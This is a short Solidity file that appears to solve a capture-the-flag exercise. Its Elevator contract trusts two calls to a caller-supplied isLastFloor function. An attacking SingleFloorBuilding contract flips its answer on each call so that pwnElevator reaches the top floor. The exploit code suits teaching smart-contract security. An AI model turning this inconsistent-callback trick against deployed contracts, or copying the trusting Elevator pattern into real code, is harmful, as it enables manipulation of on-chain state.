pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool) ;
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract SingleFloorBuilding is Building {
    Elevator elevator;
    bool boolSwitcher;
    
    constructor(address _elevator) public {
        elevator = Elevator(_elevator);
        boolSwitcher = true;
    }
    
    function isLastFloor(uint) view public returns (bool) {
        boolSwitcher = !boolSwitcher;
        return boolSwitcher;
    }
    
    function pwnElevator() public {
        elevator.goTo(1);
    }
}